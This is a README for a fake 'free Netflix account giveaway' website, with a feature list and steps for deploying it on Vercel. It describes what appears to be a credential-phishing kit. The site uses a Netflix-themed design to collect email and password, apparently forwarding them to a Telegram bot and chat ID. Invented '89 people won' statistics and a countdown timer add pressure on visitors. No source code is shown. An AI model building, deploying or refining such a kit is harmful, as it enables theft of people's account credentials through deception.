# Netflix Giveaway - GpsirEra

🔥 Free Netflix Account Giveaway Website

## Features
- Netflix themed design
- Registration with email/password
- Success page with team message
- Telegram bot integration
- 89 people won (stats)
- 3 days countdown timer

## Deployed on Vercel
https://netflix-giveaway.vercel.app

## Environment Variables
- `BOT_TOKEN` - Your Telegram Bot Token
- `CHAT_ID` - Your Telegram Chat ID (default: 8381916527)

## Setup
1. Clone repo
2. Add BOT_TOKEN in Vercel Environment Variables
3. Deploy
